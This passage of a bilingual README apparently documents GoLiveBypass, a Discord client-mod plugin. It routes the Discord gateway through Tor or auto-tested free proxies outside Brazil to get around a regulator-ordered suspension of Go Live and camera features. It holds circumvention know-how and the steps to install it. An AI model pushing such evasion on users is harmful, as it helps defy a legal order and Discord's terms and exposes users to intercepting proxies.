lote 1: 10 testadas, 3 alcancaram o Discord
socks5://... recusada: saida em BR
socks5://... passou: 1535ms, saida em DE
aplicando socks5://... so em gateway.discord.gg, remote-auth-gateway.discord.gg
sessao aberta | atribuicao do video guard: null
  o cliente aceita video? supports true | supportsInApp true | desktop true
o servidor liberou video nesta sessao, soltando o proxy
```

A linha que importa é `atribuicao do video guard: null`. **`null` significa que o servidor nem tentou te bloquear** — foi o que a proxy comprou. Se aparecer `variantId: 2`, o gateway subiu pelo seu IP real, e o plugin vai recarregar para tentar de novo.

## Estrutura

```
goLiveBypass/
├── index.tsx                      # renderer: patches do video guard e do stream, seletor de região,
│                                  #   override do RTCRegionStore, eventos de fluxo
└── native.ts                      # processo principal: session.setProxy, validação TLS das proxies,
                                   #   detecção de Tor, registro, nova tentativa, prazos de segurança

installer/
├── GoLiveBypass-Installer.bat     # Windows: dois cliques, libera a execução e chama o .ps1
├── GoLiveBypass-Installer.ps1     # Windows: instalador automático
└── golivebypass-installer.sh      # Linux: mesmo instalador, mesmo menu

standalone/
├── golivebypass.js                # o bypass inteiro, sem build: proxy, roteador SOCKS,
│                                  #   regra por host, registro
├── GoLiveBypass-Standalone.bat    # Windows: dois cliques
├── GoLiveBypass-Standalone.ps1    # Windows: instala direto no Discord
└── golivebypass-standalone.sh     # Linux: o mesmo

assets/
└── instalacao.gif                 # o vídeo do começo deste README
```

## Licença

GPL-3.0-or-later, mesma licença do Vencord/Equicord. Veja [LICENSE](LICENSE).

## Autor

**bezumiya**

- GitHub: [bezumiya/GoLiveBypass](https://github.com/bezumiya/GoLiveBypass)
- Twitter: [@obezumiya](https://twitter.com/obezumiya)
- Discord: `1366453661970071633`

## Agradecimentos

**Obrigado ao [Vithor](https://github.com/Vith0r)** pelo instalador.

Ele escreveu o primeiro instalador do GoLiveBypass por conta própria, e foi ele quem mostrou
que dava para automatizar tudo isso num script só. O instalador que está aqui hoje nasceu
desse trabalho.

# English

**GoLiveBypass** is an **Equicord/Vencord** plugin, made by a Brazilian developer, that **restores Go Live and camera for Brazilian Discord users**: it boots Discord entirely behind a proxy outside Brazil (Tor or a tested, automatically fetched free proxy) **on every launch and reload**, so Discord's region gate — evaluated once at voice-channel join using the gateway WebSocket origin IP, and never re-evaluated mid-call — unlocks the features. The proxy is dropped once the session opens, restoring a direct connection. As a bonus, your real IP stays hidden during authentication.

It was written after Brazil's data protection authority (ANPD) [ordered Discord to suspend live streaming (Go Live) in Brazil](https://www.gov.br/anpd/pt-br/assuntos/noticias/em-medida-preventiva-anpd-determina-que-discord-suspenda-transmissoes-ao-vivo-no-brasil) in August 2026, shortly after the country blocked X (Twitter). It works while the gateway WebSocket stays alive. If it reconnects over your real IP, Ctrl+R will not help: the proxy is only applied before the gateway is created, so you have to quit Discord from the tray and open it again. Bypassing the restriction may violate Discord's ToS.

- Desktop Discord with Equicord or Vencord injected. Vesktop and Equibop are not supported by the installers, since they bundle the mod instead of loading it from a checkout. Not available on the browser extension.
- Dependencies: Git, Node.js 22+, pnpm 11 (via `corepack enable`), and a desktop Discord client. Tor is optional, not required: by default the plugin picks and validates a free proxy on its own.
- **Your calls stay on the region you pick.** Creating the session abroad makes Discord rank foreign voice servers, so the plugin overrides the three `RTCRegionStore` getters that feed `preferred_region` / `preferred_regions` in the gateway `VOICE_STATE_UPDATE`. The override is evaluated at read time, so Discord's latency test cannot undo it, and it writes nothing into Discord's persisted state, so the region is not left pinned after you remove the plugin. Restored on `stop()`.
- Proxy order: your manual proxy, then a local Tor (`127.0.0.1:9150` for Tor Browser, `9050` for the daemon), then a validated free proxy.
- Free proxies are weak for anonymity — prefer Tor.
- Free proxies are ranked by the `alive` / `uptime` / `timeout` metadata the list already returns, port 4145 is dropped (measured 14/14 TLS interception), up to 10 candidates are probed in parallel with a real TLS handshake plus `GET /api/v9/gateway` expecting HTTP 200, and the exit country is verified over TLS. Measured: random pick with a handshake-only test works 12% of the time, ranked with a real TLS test works 60%.
- It cannot leave you unable to open Discord: the proxy is installed as `proxy,direct://` so Chromium falls back on its own, a main-process deadline drops it after 120s, `did-fail-load` drops it immediately, a boot marker refuses to re-apply after a boot that never finished, and a free proxy is never persisted to disk.
- Install: copy the `goLiveBypass` folder into `src/userplugins/` of your Equicord or Vencord clone, then `pnpm install && pnpm build && pnpm inject`, fully restart Discord, and enable **GoLiveBypass** in plugin settings.
- Made by **bezumiya** — [GitHub](https://github.com/bezumiya/GoLiveBypass), [Twitter](https://twitter.com/obezumiya), Discord `1366453661970071633`.
- Thanks to **[Vithor](https://github.com/Vith0r)** for the installer: he wrote the first GoLiveBypass installer on his own and showed that the whole setup could be automated in a single script.
- License: GPL-3.0-or-later.
